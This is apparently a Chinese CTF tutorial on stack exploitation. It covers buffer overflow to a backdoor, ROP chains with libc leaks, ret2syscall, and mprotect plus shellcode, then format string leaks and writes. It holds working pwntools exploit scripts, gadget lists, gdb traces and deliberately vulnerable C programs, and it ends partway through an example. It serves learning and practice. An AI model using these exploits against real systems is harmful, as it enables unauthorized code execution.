---
sort: 2
---

# PWN-Stack

## 1. 小知识

- 检查文件是否加壳

```
checksec pwn1
read(0, s, size)
```

- 如果 nx 关闭，可以考虑传入 shellcode，然后控制跳转地址跳过去执行；例如将 shellcode 传入缓冲区的开头， 然后控制 eip 到 shellcode 的开头. shellcode 数据库[http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)
- IEE754 浮点数转 16 进制要在末尾补零，而不是开头，例如`11.28125`转为 16 进制后是`0x413480`，写入 32 位程序时要在后面补零到 4 位，写入 64 位程序时要补零到 8 位。
- 64 位程序，参数传递时，参数放在寄存器中，前六个参数是通过 rdi,rsi,rdx,rcx,r8 和 r9 进行传递的；多的放在栈中
- 32 位程序，参数传递时，从栈顶取, 参数从右到左压入栈中.（系统调用时参数放在寄存器中，前四个参数通过 eax，ebx，ecx，edx）
- 函数返回结果会放在 RAX\EAX 中
- call 指令会将 call 的下一处地址入栈, 在 ret 的时候就会根据这个地址跳转
- ret 汇编指令等价于：

```asm
pop rip
```

- leave 汇编指令等价于

```asm
mov esp, ebp           //函数返回时，esp作为新的栈底指针
pop ebp
```

- leak 地址的时候, 可以这么操作(x64): `read_leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) `
- pwntools 的一些语法糖

```python
libc = ELF('libc.so.6')
read_addr = libc.symbols["read"]  # 查找符号表
bin_sh_str = libc.search('/bin/sh').next() # 查找字符串
```

- one_gadget
  `one_gadget`可以找出 libc 中存在的 getshell 代码地址, 通常可以用于`heap`的覆盖`__malloc_hook`或`__free_hook`, 使用方式:

```
one_gadget libc-2.23.so
```

- 段寄存器不能直接用立即数 mov, 需要使用寄存器传递
- patch 的时候, 如果写 hook 函数要地址对齐, 确保写的地址有执行权限. IDA `c`显示为汇编代码, `p`显示为函数
- `$0`可以替代`/bin/sh`

## 2 基本的 rip 溢出

### 2.1 原理:

通过溢出的方式控制函数返回地址, 将地址改写为我们想要的地址.

```
正常的栈帧结构:
Stackframe
+------------------+
|    parameter     |  low address
+------------------+
|   local var1     |  <- 4 byte
+------------------+
|   local var2     |  <- 8 byte
+------------------+
|   local var2     |
+------------------+  <- ebp指针
|    return addr   |  high address
+------------------+
```

溢出后, 返回地址被替换为了`aaaa`(0x61616161)

```
溢出后的栈帧结构
Stackframe
+------------------+
|    parameter     |
+------------------+
|       abcd       |  <- local var1
+------------------+
|       aaaa       |  <- local var2
+------------------+
|       aaaa       |
+------------------+
|       aaaa       |  <- ebp
+------------------+
|       aaaa       |  <- return addr
+------------------+
```

### 2.2 实操(buuctf pwn1):

1. 通过 IDEA 查看, 该 elf 文件存在 rip 溢出, 有一个 fun 函数为后门函数, 函数地址为`0x401186`  
   ![](/CTF/v_images/20200515104107439_19944168.png)  
   接下来设法获取 main 函数中 ebp 的地址
2. 打开 gdb-peda 调试 pwn1, 生成 200 个字符, 发送给 pwn1:  
   在 pwngdb 中, 这个命令为:

```
cyclic 200
cyclic -l aaya
```

![](/CTF/v_images/20200515104350751_486208525.png)  
此时程序崩溃溢出, 看看栈可以发现, RBP 为`nAACAA-A`, 则`RBP+8`为返回地址所在地, 即此时的返回地址为`A(AADAA;`  
通过崩溃的栈结构, 也可以发现崩溃的首 8 各字节的地址内容为`A(AADAA;`  
![](/CTF/v_images/20200515105718396_1643374087.png)
查看`A(AADAA;`的偏移量:

```
gdb-peda$ pattern offset A(AADAA
A(AADAA found at offset: 23
```

那么我们就可以知道`ret`距离输入的偏移量为 23, 那么只需发送`23-8`(64 位程序 ret 存储 8 个字节，在 ubuntu18.04 中，使用这个方式进行 ret 补齐。在其他系统中可以直接发送`23`个字符覆盖)个任意字符+fun 地址即可, payload:

```python
from pwn import *
context.update(arch = 'amd64', os = 'linux', timeout = 1)	#初始化上下文环境，主要是系统、架构和读取超时时间
io = remote('node3.buuoj.cn', 29064)	#此处的IP地址和端口需要根据目标修改
# io = process('./pwn1')
system_addr = 0x401186  #函数fun()的地址
payload = ''
payload += 'A'*15 + p64(system_addr)			#使用15个任意字符填充，在其他系统中需要多加8个字符
io.sendline(payload)			#向程序输入payload，注意使用sendline()或者send()的数据末尾加上回车'\n'
io.interactive()
```

## 3. ROP 方式绕过 NX 保护

### 3.1. 原理

当程序开启 NX 保护时，我们传入的 shellcode 无法在内存页中执行。这时我们需要在汇编中找到一些“小片段（gadget）”，并跳转利用之。

- 常规 ROP 做题思路：  
  通过 ROP 泄漏 libc 的 address(如 puts_got)，计算 system 地址，然后返回到一个可以重现触发漏洞的位置(如 main)，再次触发漏洞，通过 ROP 调用 system(“/bin/sh”)。  
  这里选择泄露 puts 函数的地址，puts 函数的地址保存在 got 表中，而 got 表由 plt 表可以查找到，如下图所示：  
  ![](/CTF/v_images/20200525110924611_2032383569.png)

通过泄露的 puts 地址，可以查找到相应的 libc 版本，在 libc 中各个函数之间的偏移位置不变，可以通过计算出 libc 的基地址，再计算 system 和 binsh 的绝对地址。  
计算公式：  
已知 puts_addr(上边已经得出)和 libc 中 puts 的地址，算出 libc 的基地址为
`libcbase=puts_addr - libc.dump('puts')`，其中 dump 函数是一个 libcSeacher 工具里的一个方法，可以直接找到在 libc 中其对应函数的地址。

```python
system_addr=libcbase + libc.dump('system')
binsh_addr=libcbase + libc.dump('str_bin_sh')
```

### 3.2. 寻找 gadget

```
ROPgadget --binary <filename> | grep <gadget>
ROPgadget --binary <filename> --string <searchString>
ROPgadget --binary <filename> --only int
```

分析大概要构造的 payload 应该是

```
[buf] + [gadget rdi] + ["/bin/sh"的地址] + [system函数的地址]
```

- 64 位万能 gadget，基本所有的 x64 程序都存在。前半段用于赋值 rdi（将栈顶数据给 rdi，作为函数调用参数），后半段用于跳到其他代码片段。

```
pop rdi;ret;
```

### 3.3. 构造 ROP 链

首先要泄露出 libc 版本，从而获取 libc 基址。通过 libc 基址计算出 system()函数地址
例如通过`write`函数泄露出 libc 地址

```python
elf=ELF("./babyrop")
write_plt=elf.plt['write']
write_got=elf.got['write']
# leak libc, 覆盖read地址，调用write函数
# 相当于执行write(1, write_got, 4), 最后返回main函数
#           填充字符       调用write函数      ret address    参数1      参数2           参数3
payload = 'a'*(0xe7+4) + p32(write_plt) +  p32(main_addr) + p32(1) + p32(write_got) + p32(4)
```

注：在 64 位程序中，应将变量 pop 到`rdi`中，以作为调用函数的参数  
将 payload 发送后，能获取到`write`函数在 libc 中动态地址，由于其后 12 位是不变的，故通过 LibcSearch 查询 libc

```python
from LibcSearcher import *

libc = LibcSearcher('write', write_leak)
# 计算libc基址
libc_base = write_leak - libc.dump('write')
# 获取system地址
sys_addr = libc_base + libc.dump('system')
# 获取'/bin/sh'字符地址
str_bin_sh = libc_base + libc.dump('str_bin_sh')
# 对于64位程序，应该先把str_bin_sh存入rdi中，参考使用gadget进行操作
payload = 'a'*80 + p32(sys_addr) + p32(main_addr) + p32(str_bin_sh)
# payload = 'A'*80 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
```

### 3.4. 控制程序执行系统调用（ret2syscall）

关于系统调用的知识，请参考

- [https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8](https://zh.wikipedia.org/wiki/系统调用)  
  简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用（0x80 是系统中断的指令）。比如说这里我们利用如下系统调用来获取 shell

```c
execve("/bin/sh",NULL,NULL)
```

其中，如果程序是 32 位，所以我们需要使得

    系统调用号，即 eax 应该为 0xb，因为execve的系统调用号为0xb
    第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
    第二个参数，即 ecx 应该为 0
    第三个参数，即 edx 应该为 0

如果是 64 位程序，设法将`0x3b`传入`rax`。其余参数传递看`1.小知识`获取 64 位程序的参数传递。x64 与 x86 的不同点如下

（1）系统调用号不同.比如 x86 中 sys_write 是 4，sys_exit 是 1；而 x86_64 中 sys_write 是 1, sys_exit 是 60。linux 系统调用号实际上定义在/usr/include/asm/unistd_32.h 和/usr/include/asm/unistd_64.h 中。  
（2）系统调用所使用的寄存器不同，x86_64 中使用与 eax 对应的 rax 传递系统调用号，但是 x86_64 中分别使用 rdi/rsi/rdx 传递前三个参数，而不是 x86 中的 ebx/ecx/edx。  
（3）系统调用使用`syscall`而不是`int 80`。

比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。  
首先寻找 eax 的 gadget：

```
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

不妨选取第二个。
类似的得到控制其他寄存器的 gadgets

```
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

不妨选择

```
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

最后寻找到`/bin/sh`字符串的地址即可。

```
ROPgadget --binary rop  --string '/bin/sh'
```

payload，其中`int_0x80`是作为引起系统中断而是用的：

```
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
```

**如果没有类似`pop rax`或`pop eax`的 gadgets 怎么办?**

> 利用 read 函数的返回值，使得 rax 为`0x3b`

    read函数原型：

    ​ ssize_t read(int fd,void *buf,size_t count)

    函数返回值分为下面几种情况：

    1、如果读取成功，则返回实际读到的字节数。这里又有两种情况：一是如果在读完count要求字节之前已经到达文件的末尾，那么实际返回的字节数将 小于count值，但是仍然大于0；二是在读完count要求字节之前，仍然没有到达文件的末尾，这是实际返回的字节数等于要求的count值。

    2、如果读取时已经到达文件的末尾，则返回0。

    3、如果出错，则返回－1。

read 函数的系统调用号为`0x0`，所以必须先使得 rax 的值为 0.

### 3.5 修改内存执行权限

如果程序是静态链接的, 不使用 libc, 也找不到命令执行函数, 则可以设法使用`mprotect`修改内存中可读可写的地址, 令其有执行权限. 再 通过 read 函数将 shellcode 写入内存。  
可以通过 pwngdb 的`vmmap`查看内存页的权限以及地址.
paylaod 可以按如下构建

```python
# pop3_ret的作用是将之前压入栈中的参数出栈, 维持栈平衡.
# mem_addr是要修改权限的内存地址
# mem_proc应为0x7,代表rwx
payload = 'A'*0x20 + p32(mprotect_addr) + p32(pop3_ret) + p32(mem_addr) + p32(mem_size) + p32(mem_proc)
payload += p32(read_addr) + p32(pop3_ret) + p32(0) + p32(mem_addr) + p32(0x100) + p32(mem_addr)
p.send(payload)

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')
p.send(shellcode)

p.interactive()
```

---

## 4. 格式化字符串漏洞

### 4.1 原理

格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说`%s`表明我们会输出一个字符串参数。  
例如这个例子：  
![](/CTF/v_images/20200831090620574_864047762.png)  
**注：这里我们假设 3.14 上面的值为某个未知的值。**

在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况

- 当前字符不是%，直接输出到相应标准输出。
- 当前字符是%， 继续读取下一个字符
  - 如果没有字符，报错
  - 如果下一个字符是%,输出%
  - 否则根据相应的字符，获取相应的参数，对其进行解析并输出

那么假设，此时我们在编写程序时候，写成了下面的样子

```
printf("Color %s, Number %d, Float %4.2f");
```

此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为

    解析其地址对应的字符串
    解析其内容对应的整形值
    解析其内容对应的浮点值

对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。

这基本就是格式化字符串漏洞的基本原理了。

### 4.2 泄露内存利用

利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作

- 泄露栈内存
  - 获取某个变量的值
  - 获取某个变量对应地址的内存
- 泄露任意地址内存
  - 利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址
  - 盲打，dump 整个程序，获取有用信息。

### 4.3 泄露栈内存

例如，给定如下程序

```c
#include <stdio.h>
int main(){
    char s[100];
    int a = 0, b = 0x22222222, c = -1;
    scanf("%s", s);
    printf("%08x.%08x.%08x.%s\n", a, b, c, s);
    printf(s);
    return 0;
}
```

然后，我们简单编译一下

```
➜  leakmemory git:(master) ✗ make
gcc -fno-stack-protector -no-pie -o leakmemory leakmemory.c
leakmemory.c: In function ‘main’:
leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]
   printf(s);
```

根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数(64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。

---

#### 获取栈数值变量

首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下

```gdb
➜  leakmemory git:(master) ✗ ./leakmemory
%08x.%08x.%08x
00000001.22222222.ffffffff.%08x.%08x.%08x
ffcfc400.000000c2.f765a6bb
```

为了能更细致的观察, 我们使用 gdb 进行调试. 在 printf 处下断点, 输入`%08x.%08x.%08x`, 调试信息如下:

```gdb
[-------------------------------------code-------------------------------------]
   0xf7e4c67b <fprintf+27>:     ret
   0xf7e4c67c:  xchg   ax,ax
   0xf7e4c67e:  xchg   ax,ax
=> 0xf7e4c680 <printf>: call   0xf7f22c59
   0xf7e4c685 <printf+5>:       add    eax,0x16997b
   0xf7e4c68a <printf+10>:      sub    esp,0xc
   0xf7e4c68d <printf+13>:      mov    eax,DWORD PTR [eax-0x68]
   0xf7e4c693 <printf+19>:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd24c --> 0x80484bf (<main+84>:      add    esp,0x20)
0004| 0xffffd250 --> 0x8048563 ("%08x.%08x.%08x.%s\n")
0008| 0xffffd254 --> 0x0
0012| 0xffffd258 ("\"\"\"\"\377\377\377\377p\322\377\377p\322\377\377p*\376\367\b\334\377\367%08x.%08x.%08x")
0016| 0xffffd25c --> 0xffffffff
0020| 0xffffd260 --> 0xffffd270 ("%08x.%08x.%08x")
0024| 0xffffd264 --> 0xffffd270 ("%08x.%08x.%08x")
0028| 0xffffd268 --> 0xf7fe2a70 (add    edi,0x1a590)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序  
此时程序运行到下一个`printf`中

```gdb
[-------------------------------------code-------------------------------------]
   0xf7e4c67b <fprintf+27>:     ret
   0xf7e4c67c:  xchg   ax,ax
   0xf7e4c67e:  xchg   ax,ax
=> 0xf7e4c680 <printf>: call   0xf7f22c59
   0xf7e4c685 <printf+5>:       add    eax,0x16997b
   0xf7e4c68a <printf+10>:      sub    esp,0xc
   0xf7e4c68d <printf+13>:      mov    eax,DWORD PTR [eax-0x68]
   0xf7e4c693 <printf+19>:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd25c --> 0x80484ce (<main+99>:      add    esp,0x10)
0004| 0xffffd260 --> 0xffffd270 ("%08x.%08x.%08x")
0008| 0xffffd264 --> 0xffffd270 ("%08x.%08x.%08x")
0012| 0xffffd268 --> 0xf7fe2a70 (add    edi,0x1a590)
0016| 0xffffd26c --> 0xf7ffdc08 --> 0xf7fd7000 (jg     0xf7fd7047)
0020| 0xffffd270 ("%08x.%08x.%08x")
0024| 0xffffd274 (".%08x.%08x")
0028| 0xffffd278 ("x.%08x")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

此时，由于格式化字符串为`%x%x%x`，所以，程序 会将栈上的`0xffffd264`及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。

```
gdb-peda$ c
Continuing.
ffffd270.f7fe2a70.f7ffdc08[Inferior 1 (process 31506) exited normally]
```

需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢？肯定是可以的啦。方法如下

```
%n$x
```

利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。  
这里我们再次以 gdb 调试一下。

```gdb
gdb-peda$ r
Starting program: /home/gong/Desktop/ctf/pwn/format-string/leakmemory
%3$x
[----------------------------------registers-----------------------------------]
EAX: 0xffffd270 ("%3$x")
EBX: 0x0
ECX: 0x7fffffe0
EDX: 0xf7fb7870 --> 0x0
ESI: 0xf7fb6000 --> 0x1b2db0
EDI: 0xf7fb6000 --> 0x1b2db0
EBP: 0xffffd2e8 --> 0x0
ESP: 0xffffd25c --> 0x80484ce (<main+99>:       add    esp,0x10)
EIP: 0xf7e4c680 (<printf>:      call   0xf7f22c59)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e4c67b <fprintf+27>:     ret
   0xf7e4c67c:  xchg   ax,ax
   0xf7e4c67e:  xchg   ax,ax
=> 0xf7e4c680 <printf>: call   0xf7f22c59
   0xf7e4c685 <printf+5>:       add    eax,0x16997b
   0xf7e4c68a <printf+10>:      sub    esp,0xc
   0xf7e4c68d <printf+13>:      mov    eax,DWORD PTR [eax-0x68]
   0xf7e4c693 <printf+19>:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd25c --> 0x80484ce (<main+99>:      add    esp,0x10)
0004| 0xffffd260 --> 0xffffd270 ("%3$x")
0008| 0xffffd264 --> 0xffffd270 ("%3$x")
0012| 0xffffd268 --> 0xf7fe2a70 (add    edi,0x1a590)
0016| 0xffffd26c --> 0xf7ffdc08 --> 0xf7fd7000 (jg     0xf7fd7047)
0020| 0xffffd270 ("%3$x")
0024| 0xffffd274 --> 0xffffd300 --> 0x1
0028| 0xffffd278 --> 0xe0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e4c680 in printf () from /lib/i386-linux-gnu/libc.so.6
gdb-peda$ c
Continuing.
f7ffdc08[Inferior 1 (process 31524) exited normally]
```

可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7ffdc08。

---

#### 获取栈变量对应字符串

此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到%s 了。
**当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。**

---

#### 小技巧总结

```
利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。
利用%s来获取变量所对应地址的内容，只不过有零截断。
利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。
```

---

### 4.4 泄露任意地址内存

可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。

我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例.  
输入`%s`

```gdb
[----------------------------------registers-----------------------------------]
EAX: 0xffffd270 --> 0xf7007325
EBX: 0x0
ECX: 0x7fffffe2
EDX: 0xf7fb7870 --> 0x0
ESI: 0xf7fb6000 --> 0x1b2db0
EDI: 0xf7fb6000 --> 0x1b2db0
EBP: 0xffffd2e8 --> 0x0
ESP: 0xffffd25c --> 0x80484ce (<main+99>:       add    esp,0x10)
EIP: 0xf7e4c680 (<printf>:      call   0xf7f22c59)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e4c67b <fprintf+27>:     ret
   0xf7e4c67c:  xchg   ax,ax
   0xf7e4c67e:  xchg   ax,ax
=> 0xf7e4c680 <printf>: call   0xf7f22c59
   0xf7e4c685 <printf+5>:       add    eax,0x16997b
   0xf7e4c68a <printf+10>:      sub    esp,0xc
   0xf7e4c68d <printf+13>:      mov    eax,DWORD PTR [eax-0x68]
   0xf7e4c693 <printf+19>:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd25c --> 0x80484ce (<main+99>:      add    esp,0x10)
0004| 0xffffd260 --> 0xffffd270 --> 0xf7007325
0008| 0xffffd264 --> 0xffffd270 --> 0xf7007325
0012| 0xffffd268 --> 0xf7fe2a70 (add    edi,0x1a590)
0016| 0xffffd26c --> 0xf7ffdc08 --> 0xf7fd7000 (jg     0xf7fd7047)
0020| 0xffffd270 --> 0xf7007325
0024| 0xffffd274 --> 0xffffd39c --> 0xffffd519 ("XDG_SESSION_ID=5")
0028| 0xffffd278 --> 0xe0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e4c680 in printf () from /lib/i386-linux-gnu/libc.so.6
gdb-peda$ c
Continuing.
%s[Inferior 1 (process 36279) exited normally]
```

可以看出在栈上的第二个变量就是我们的格式化字符串地址`0xffffd270`，同时该地址存储的也确实是是"%s"格式化字符串内容。

那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址`addr`的内容。

```
addr%k$s
```

这是因为，32 位程序下，地址恰好占用 4 个字节，若输入`%k$s`能使程序打印字符`%k$s`对应 16 进制的地址（0x73243425）中的值（但实际上这个地址是不允许访问的，所以程序会崩溃），那么加上`addr`后，栈上第 k+1 个变量变从`%k$s`变为`addr`。所以`addr%k$s`输入后，程序会打印出`addr`对应地址的值。如果这个`addr`是一个合法的地址，那么程序就会打印出这个地址中的值。用这个方法可以获取 got 表中某些函数的地址。

下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定

```
[tag]%p%p%p%p%p%p..
```

一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个%p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符'A'作为特定字符，同时还是利用之前编译好的程序，如下

```
gong@ubuntu:~/Desktop/ctf/pwn/format-string$ ./leakmemory
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
00000000.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xffa9e0f00xf7ee5a700xf7f00c080x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffa9e1b40xf7eb90000xf7ded017
```

由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下

```
gong@ubuntu:~/Desktop/ctf/pwn/format-string$ ./leakmemory
%4$s
00000000.22222222.ffffffff.%4$s
Segmentation fault (core dumped)
```

可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。

```gdb
[----------------------------------registers-----------------------------------]
EAX: 0xffffd270 ("%4$s")
EBX: 0x0
ECX: 0x7fffffe0
EDX: 0xf7fb7870 --> 0x0
ESI: 0xf7fb6000 --> 0x1b2db0
EDI: 0xf7fb6000 --> 0x1b2db0
EBP: 0xffffd2e8 --> 0x0
ESP: 0xffffd25c --> 0x80484ce (<main+99>:       add    esp,0x10)
EIP: 0xf7e4c680 (<printf>:      call   0xf7f22c59)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e4c67b <fprintf+27>:     ret
   0xf7e4c67c:  xchg   ax,ax
   0xf7e4c67e:  xchg   ax,ax
=> 0xf7e4c680 <printf>: call   0xf7f22c59
   0xf7e4c685 <printf+5>:       add    eax,0x16997b
   0xf7e4c68a <printf+10>:      sub    esp,0xc
   0xf7e4c68d <printf+13>:      mov    eax,DWORD PTR [eax-0x68]
   0xf7e4c693 <printf+19>:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd25c --> 0x80484ce (<main+99>:      add    esp,0x10)
0004| 0xffffd260 --> 0xffffd270 ("%4$s")
0008| 0xffffd264 --> 0xffffd270 ("%4$s")
0012| 0xffffd268 --> 0xf7fe2a70 (add    edi,0x1a590)
0016| 0xffffd26c --> 0xf7ffdc08 --> 0xf7fd7000 (jg     0xf7fd7047)
0020| 0xffffd270 ("%4$s")
0024| 0xffffd274 --> 0xffffd300 --> 0x1
0028| 0xffffd278 --> 0xe0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e4c680 in printf () from /lib/i386-linux-gnu/libc.so.6
```

显然 0xffffd270 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。

那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。

首先，使用 IDA 获取 scanf@got 的地址，如下  
![](/CTF/v_images/20200901105309307_246661860.png)

下面我们利用 pwntools 构造 payload 如下

```python
from pwn import *
p = process('./leakmemory')
elf = ELF('./leakmemory')
scanf_gor_addr = elf.got['__isoc99_scanf']
print(hex(scanf_gor_addr))
payload = p32(scanf_gor_addr) + "%4$s"
p.sendline(payload)
p.recvuntil("%4$s\n")
print(hex(u32(p.recv()[4:8])))
```

输出如下：

```
gong@ubuntu:~/Desktop/ctf/pwn/format-string$ python exp.py
[+] Starting local process './leakmemory': pid 36741
[*] '/home/gong/Desktop/ctf/pwn/format-string/leakmemory'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
0x804a014
[*] Process './leakmemory' stopped with exit code 0 (pid 36741)
0xf7e360d0
```

至此，我们获取了 scanf 的 got 地址

但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。

```
[padding][addr]
```

---

### 4.4 覆盖内存

上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢?答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型`%n`

tips:

```
%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
```

通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。

这里我们给出如下的程序来介绍相应的部分。

```c
/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
